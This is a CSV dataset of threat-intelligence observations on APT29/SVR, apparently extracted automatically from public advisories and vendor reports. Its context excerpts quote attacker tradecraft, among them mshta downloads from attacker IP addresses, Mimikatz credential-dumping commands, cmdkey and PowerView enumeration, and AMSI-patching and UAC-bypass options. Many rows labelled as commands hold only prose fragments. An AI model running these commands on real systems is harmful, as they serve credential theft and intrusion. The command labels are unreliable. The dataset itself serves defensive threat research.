schema_version,actor_ref,artifact_id,observation_id,artifact_type,value,normalized_value,disposition,observed_at,observed_at_precision,observed_at_status,observed_at_basis,source_published_at,source_id,source_path,source_location,campaign_refs,malware_refs,infrastructure_refs,roles,campaign_count,seen_in_multiple_campaigns,confidence,tlp,extraction_method,context_excerpt,analyst_notes
1.0.0,actor--apt29,artifact--sha256:81b6ddb79f2bdf4118308f22a83bee019a57926ad57aa712a755e139bf3ffe8b,observation--sha256:0cd292472ac94526ae7c9ed937debf8bfeb9c0bbfca2e693986f8bd4988b5983,command,Command Line (WMIC) [T1047,Command Line (WMIC) [T1047,candidate,,unknown,unknown,not-stated,,source--apt29--04a142b2f2b86675,APT29/aa23-347a-russian-foreign-intelligence-service-svr-exploiting-jetbrains-teamcity-cve-globally.pdf,"{""page"": 7}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"International Partnership Page 7 of 27 | Product ID: AA23-347A TLP:CLEAR TLP:CLEAR  Get-NetComputer  Get-NetGroup  Get-NetUser -UACFilter NOT_ACCOUNTDISABLE | select samaccountname, description, pwdlastset, logoncount, badpwdcount""  Get-NetDiDomain  Get-AdUser  Get-DomainUser -UserName  Get-NetUser -PreauthNotRequire  Get-NetComputer | select samaccountname  Get-NetUser -SPN | select serviceprincipalname Tunneling into Compromised Environments In selected environments the SVR used an ad",
1.0.0,actor--apt29,artifact--sha256:a824eb27524659fe1bed8bd34a774bf3578bc7e84f635e9cdb3246a5579f7734,observation--sha256:c7681857ced428e7cad4ef46e1d1b2e18a2c56148a43148d39bf2029051e2b7b,command,During the analysis of executed commands the PTI team discovered multiple uses of mshta,During the analysis of executed commands the PTI team discovered multiple uses of mshta,candidate,,unknown,unknown,not-stated,,source--apt29--e344b60642e6b332,SunBurst/SilverFish_Solarwinds.pdf,"{""page"": 23}",[],"[""malware--sunburst""]",[],[],0,false,medium,TLP:CLEAR,pdf-text,TLP:WHITE SilverFish APT Group During the analysis of executed commands the PTI team discovered multiple uses of mshta utility for executing external HTA scripts. The following list contains every external IP address that is used for executing HTA code. • mshta hxxp://104.128.228.76:9999/PAf3W • mshta hxxp://149 .154.157 .248:21/KDnbc • mshta hxxp://149 .154.157 .248:443/HRNrz • mshta hxxp://149 .154.157 .248:443/HRNrz • mshta hxxp://149 .154.157 .248:443/veUlx • mshta hxxp://149 .154.157 .248:4,
1.0.0,actor--apt29,artifact--sha256:7d70ddde9f3f4819491e9d450424f0eecb11fc10a63bfc63fc7659d161055cd3,observation--sha256:620da173ba9b8678035697edd904015727663741a07e31708c2c81b23e20488e,command,Executes the BASE64 encoded powershell,Executes the BASE64 encoded powershell,candidate,,unknown,unknown,not-stated,,source--apt29--e344b60642e6b332,SunBurst/SilverFish_Solarwinds.pdf,"{""page"": 21}",[],"[""malware--sunburst""]",[],[],0,false,medium,TLP:CLEAR,pdf-text,TLP:WHITE SilverFish APT Group Occurance Command Explanation 2880 nltest /dclist : Lists all domain controllers in the domain. 2283 nltest /domain_trusts Returns a list of trusted domains. 1547 cmdkey /list Displays the list of stored user names and credentials. 670 net group ”domain admins” /domain Lists domain admin users. 537 dir c:\\programdata Prints the contents of ”programdata” directory (used for enumerating the installed software) 206 powershell -nop -enc %Trimmed...% Executes the BASE6,
1.0.0,actor--apt29,artifact--sha256:d914e2cbdf47088e18266257a27dbf95157f4867ff760668a0658c1784cfb600,observation--sha256:f22e51c9e3ccb046c271c05be181a256eaa5a36230a31370aadb4f1cbfbea9e9,command,Figure 26. Decoded Cobalt Strike beacon loader Powershell code,Figure 26. Decoded Cobalt Strike beacon loader Powershell code,candidate,,unknown,unknown,not-stated,,source--apt29--e344b60642e6b332,SunBurst/SilverFish_Solarwinds.pdf,"{""page"": 25}",[],"[""malware--sunburst""]",[],[],0,false,medium,TLP:CLEAR,pdf-text,"TLP:WHITE SilverFish APT Group 3.3.3 Cobalt Strike & Empire Beacons During the post-exploitation analysis, the PTI Team identified several encoded/obfuscated Powershell commands for loading Cobalt Strike and Empire beacon payloads. Almost all of the Cobalt Strike payloads are executed with compressed and encoded Powershell commands. The decoded and decompressed Powershell commands contains another Powershell loader script. The second stage script extracts the BASE64 Cobalt Strike beacon payload ",
1.0.0,actor--apt29,artifact--sha256:d1230775505ebac31b0f49b9356bfa0147b5d547506557e7971af311b6a6ef2d,observation--sha256:257653989f70f218dd9e59b3f223a65fed34896c41e2f05c4bae73bf7b0c146b,command,"In 2021, public reporting detailed BlueBravo’s use of variousiterationsof aphishing campaignemulatinggovernment entities. The various campaigns delivered ISO files via methods such asusingURLs todownload the ISO file and execute an LNK file, and usingan HTMLattachmentin the email to initiatethe download of an ISO file. This activity was used to deployNativeZone, an umbrella term for theircustom Cobalt Strike loaders. NativeZone typically uses rundll32.exe to load and execute follow-onpayload(s).","In 2021, public reporting detailed BlueBravo’s use of variousiterationsof aphishing campaignemulatinggovernment entities. The various campaigns delivered ISO files via methods such asusingURLs todownload the ISO file and execute an LNK file, and usingan HTMLattachmentin the email to initiatethe download of an ISO file. This activity was used to deployNativeZone, an umbrella term for theircustom Cobalt Strike loaders. NativeZone typically uses rundll32.exe to load and execute follow-onpayload(s",candidate,,unknown,unknown,not-stated,,source--apt29--a3bd7e62ec01dc4e,APT29/BlueBravo Uses Ambassador Lure to Deploy GraphicalNeutrino Malware.pdf,"{""page"": 3}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"CYBER THREAT ANALYSIS represents an ongoing interest from threat actors affiliated with the SVR and aligns with their continuedintent to gain access to strategic information from entities and organizations engaged in foreign policy.Any country with a nexus to the Ukraine crisis, particularly those with key geopolitical, economic, ormilitary relationships with Russia or Ukraine, are at increased risk of targeting. Key Judgments ● We have identified new malware used by BlueBravo, which overlaps wi",
1.0.0,actor--apt29,artifact--sha256:53b880f0a78a28c684ffa0f1c5a7bb9bc6eedc3decb22e5dbb29dffe090d8797,observation--sha256:f9e9ff1fe41e6420ce998a514fc570f549a652afb1341780685b7557d5068216,command,Meterpreter and Powershell Empire. The major difference is that Koadic does most of,Meterpreter and Powershell Empire. The major difference is that Koadic does most of,candidate,,unknown,unknown,not-stated,,source--apt29--e344b60642e6b332,SunBurst/SilverFish_Solarwinds.pdf,"{""page"": 22}",[],"[""malware--sunburst""]",[],[],0,false,medium,TLP:CLEAR,pdf-text,"TLP:WHITE SilverFish APT Group During the investigation of executed commands, the PTI Team noticed that the IP addresses used for downloading post-exploitation scripts also matched the characteristics of the initial databasegalore.com domain used for fingerprinting the SilverFish infrastructure. The IP was serving the same bootstrap theme on port 80 and PowerMTA service on port 9897 (see in Figure 21). Figure 21. IP within C&C linking back to another server with the same fingerprint 3.3.1 Koadic",
1.0.0,actor--apt29,artifact--sha256:560d4e7a1916713281c7922d18757039c3950f5e1eeee820bfb6ea9b70a85e45,observation--sha256:b9a2145d531279a40c645837d791c7c36055a39a6dc3aa6dded791bc3d5951cd,command,Microsoft\Powershell\3\PowerShellEngine or HKLM\Software\Microsoft\,Microsoft\Powershell\3\PowerShellEngine or HKLM\Software\Microsoft\,candidate,,unknown,unknown,not-stated,,source--apt29--d3e05b171f0b491f,APT29/APT29_Informe LAB52- EasterBunny_Complete.pdf,"{""page"": 82}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"S2GRUPO | LAB5281 The recognition continues to obtain the version of Powershell installed on the computer. This information is found in the keys HKLM\Software\ Microsoft\Powershell\3\PowerShellEngine or HKLM\Software\Microsoft\ Powershell\0\PowerShellEngine. If it is not installed or there is an error, it will print <not installed> or error. Before finishing, access the information in the HKLM\SOFTWARE\Microsoft\Cryptography\MachineGUID key that the malware has already used and finally add a fie",
1.0.0,actor--apt29,artifact--sha256:4df2c30b6e02f2174366abd69179c49cd02e09ada6edb50c76da04830ca36440,observation--sha256:aaf2869367d0b2ed27aa122f9e18132029bdbee5c064ab012bc2c05f956468c3,command,PSVersion: < <Powershell Version> > \n,PSVersion: < <Powershell Version> > \n,candidate,,unknown,unknown,not-stated,,source--apt29--d3e05b171f0b491f,APT29/APT29_Informe LAB52- EasterBunny_Complete.pdf,"{""page"": 82}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"S2GRUPO | LAB5281 The recognition continues to obtain the version of Powershell installed on the computer. This information is found in the keys HKLM\Software\ Microsoft\Powershell\3\PowerShellEngine or HKLM\Software\Microsoft\ Powershell\0\PowerShellEngine. If it is not installed or there is an error, it will print <not installed> or error. Before finishing, access the information in the HKLM\SOFTWARE\Microsoft\Cryptography\MachineGUID key that the malware has already used and finally add a fie",
1.0.0,actor--apt29,artifact--sha256:dbf348832054ddca3e4f18938eb05d209749d05ca6a39d49ceabea866aac7a9e,observation--sha256:db6f6fb2a41eabb57b28cc3f7323e1db7118288045a570c15c4c26a1cdc68f96,command,"Powershell\0\PowerShellEngine. If it is not installed or there is an error, it","Powershell\0\PowerShellEngine. If it is not installed or there is an error, it",candidate,,unknown,unknown,not-stated,,source--apt29--d3e05b171f0b491f,APT29/APT29_Informe LAB52- EasterBunny_Complete.pdf,"{""page"": 82}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"S2GRUPO | LAB5281 The recognition continues to obtain the version of Powershell installed on the computer. This information is found in the keys HKLM\Software\ Microsoft\Powershell\3\PowerShellEngine or HKLM\Software\Microsoft\ Powershell\0\PowerShellEngine. If it is not installed or there is an error, it will print <not installed> or error. Before finishing, access the information in the HKLM\SOFTWARE\Microsoft\Cryptography\MachineGUID key that the malware has already used and finally add a fie",
1.0.0,actor--apt29,artifact--sha256:812e5eeaf826ce59439124bbf1b7f6e95d95e210be0b9a96baa365db6a5cc2c0,observation--sha256:1ef012e0c4ab149491389f309dd0a9fc3fc188168490e4df9149ebf69f8c433b,command,"SECURITY registry hives, and used powershell to stage .zip archives in the C:\Windows\Temp\","SECURITY registry hives, and used powershell to stage .zip archives in the C:\Windows\Temp\",candidate,,unknown,unknown,not-stated,,source--apt29--04a142b2f2b86675,APT29/aa23-347a-russian-foreign-intelligence-service-svr-exploiting-jetbrains-teamcity-cve-globally.pdf,"{""page"": 6}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"International Partnership Page 6 of 27 | Product ID: AA23-347A TLP:CLEAR TLP:CLEAR  lsadump::sam  sekurlsa::logonpasswords Persistence The SVR relied on scheduled tasks [T1053.005] to secure persistent execution of backdoors. Depending on the privileges the SVR had, their executables were stored in one of following directories:  C:\Windows\temp  C:\Windows\System32  C:\Windows\WinStore The SVR made all modifications using the schtasks.exe binary. It then had multiple variants of arguments p",
1.0.0,actor--apt29,artifact--sha256:0f11d751b437dcc77299a77392ceded3d3c7f8626531ab28cfd750b69ac88de3,observation--sha256:454e6a7f50705c6bf19608ef4f7f4e830b0b4b08ebf7f745157226c8f794036e,command,SVR cyber actors execute these powershell commands to perform host,SVR cyber actors execute these powershell commands to perform host,candidate,,unknown,unknown,not-stated,,source--apt29--04a142b2f2b86675,APT29/aa23-347a-russian-foreign-intelligence-service-svr-exploiting-jetbrains-teamcity-cve-globally.pdf,"{""page"": 9}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,International Partnership Page 9 of 27 | Product ID: AA23-347A TLP:CLEAR TLP:CLEAR Table 2: SVR Cyber Actors’ ATT&CK Techniques for Enterprise – Initial Access Technique Title ID Use Exploit Public-Facing Application T1190 SVR cyber actors exploit internet- connected JetBrains TeamCity server using CVE-2023-42793 for initial access. Table 3: SVR Cyber Actors’ ATT&CK Techniques for Enterprise: Execution Techniqu e Title ID Use Comman d and Scripting Interprete r: PowerSh ell T1059.0 01 SVR cyber ,
1.0.0,actor--apt29,artifact--sha256:45d4d999e495c67cfe62d5ee4b3e43c1a44c962eeb8f7fbe2f9c416f9a3dda9d,observation--sha256:5781eb213c20f331bd2ceab52bacc578f93e61b2a0cc5f251bc42c3fcba651db,command,SVR cyber actors used powershell commands to compress Microsoft SQL,SVR cyber actors used powershell commands to compress Microsoft SQL,candidate,,unknown,unknown,not-stated,,source--apt29--04a142b2f2b86675,APT29/aa23-347a-russian-foreign-intelligence-service-svr-exploiting-jetbrains-teamcity-cve-globally.pdf,"{""page"": 9}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,International Partnership Page 9 of 27 | Product ID: AA23-347A TLP:CLEAR TLP:CLEAR Table 2: SVR Cyber Actors’ ATT&CK Techniques for Enterprise – Initial Access Technique Title ID Use Exploit Public-Facing Application T1190 SVR cyber actors exploit internet- connected JetBrains TeamCity server using CVE-2023-42793 for initial access. Table 3: SVR Cyber Actors’ ATT&CK Techniques for Enterprise: Execution Techniqu e Title ID Use Comman d and Scripting Interprete r: PowerSh ell T1059.0 01 SVR cyber ,
1.0.0,actor--apt29,artifact--sha256:2e561cd0d03bb40dcc8818b73c2181899ee59af7818ae7d0dc5ed971bbedd0c4,observation--sha256:89c49d1bc52626fbf302cf20032851fa24275bf95deffffe5b3db01c66cd10c1,command,"Spawn new bot instance elevated (slui, build>=9600, WIN8.1, WIN10) powershell required","Spawn new bot instance elevated (slui, build>=9600, WIN8.1, WIN10) powershell required",candidate,,unknown,unknown,not-stated,,source--apt29--e344b60642e6b332,SunBurst/SilverFish_Solarwinds.pdf,"{""page"": 13}",[],"[""malware--sunburst""]",[],[],0,false,medium,TLP:CLEAR,pdf-text,"TLP:WHITE SilverFish APT Group Spawn new shell session (port 143) Spawn new shell session (port 443) (+amsi.dll patch WIN10 ONLY) Spawn new shell session (port 443) (+amsiInitFailed=true WIN10 ONLY) TEST Spawn new bot instance Spawn new bot instance elevated (slui, build>=9600, WIN8.1, WIN10) powershell required + console shown. Blocked by WD Spawn new bot instance elevated (eventvwr, WIN7, WIN8.1) Spawn new bot instance elevated (sdclt, build>=14393, WIN10) WD alert, instance dies, still works ",
1.0.0,actor--apt29,artifact--sha256:7263fcde3ce38f7f1f8f905cf7eef02c8fb6aa4ace3781ee4058d1cc3d0031ab,observation--sha256:e5684c93a8be00193ebda43616c67da49483940df59c6bb1ff76a5dde9b2d903,command,The LNK file is used to execute SNOWYAMBER DLL via rundll32.exe. The following screenshot from a hex,The LNK file is used to execute SNOWYAMBER DLL via rundll32.exe. The following screenshot from a hex,candidate,,unknown,unknown,not-stated,,source--apt29--6e4bed3453bfe94f,APT29/CERT.PL/SNOWYAMBER_.pdf,"{""page"": 8}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,Military Counterintelligence Service CERT.PL SNOWYAMBER | 8/24 The LNK file is used to execute SNOWYAMBER DLL via rundll32.exe. The following screenshot from a hex editor illustrates the shortcut target: Figure 8 - Content of the lnk file used to start SNOWYAMBER,
1.0.0,actor--apt29,artifact--sha256:b5f837d42363f8c112e5a695365d61ef0e4a671679c0e8b1fcea05f8e5dc712d,observation--sha256:274a8e116048ab2a89177f243b22fac0f77642b7d176754e62958e2757c38d1f,command,The SVR made all modifications using the schtasks.exe binary. It then had multiple variants of,The SVR made all modifications using the schtasks.exe binary. It then had multiple variants of,candidate,,unknown,unknown,not-stated,,source--apt29--04a142b2f2b86675,APT29/aa23-347a-russian-foreign-intelligence-service-svr-exploiting-jetbrains-teamcity-cve-globally.pdf,"{""page"": 6}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"International Partnership Page 6 of 27 | Product ID: AA23-347A TLP:CLEAR TLP:CLEAR  lsadump::sam  sekurlsa::logonpasswords Persistence The SVR relied on scheduled tasks [T1053.005] to secure persistent execution of backdoors. Depending on the privileges the SVR had, their executables were stored in one of following directories:  C:\Windows\temp  C:\Windows\System32  C:\Windows\WinStore The SVR made all modifications using the schtasks.exe binary. It then had multiple variants of arguments p",
1.0.0,actor--apt29,artifact--sha256:c1b6ce5c3e23591dbb593ede554433d649e21b86339d1bbc811b2febdc2d6f64,observation--sha256:df0fd6eba32d091cfc8391ba6b3a3a083e9538510eaaca920101a9f99ce7ad2c,command,"The SVR used WMIC to facilitate lateral movement [T1047],[T1210].","The SVR used WMIC to facilitate lateral movement [T1047],[T1210",candidate,,unknown,unknown,not-stated,,source--apt29--04a142b2f2b86675,APT29/aa23-347a-russian-foreign-intelligence-service-svr-exploiting-jetbrains-teamcity-cve-globally.pdf,"{""page"": 7}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"International Partnership Page 7 of 27 | Product ID: AA23-347A TLP:CLEAR TLP:CLEAR  Get-NetComputer  Get-NetGroup  Get-NetUser -UACFilter NOT_ACCOUNTDISABLE | select samaccountname, description, pwdlastset, logoncount, badpwdcount""  Get-NetDiDomain  Get-AdUser  Get-DomainUser -UserName  Get-NetUser -PreauthNotRequire  Get-NetComputer | select samaccountname  Get-NetUser -SPN | select serviceprincipalname Tunneling into Compromised Environments In selected environments the SVR used an ad",
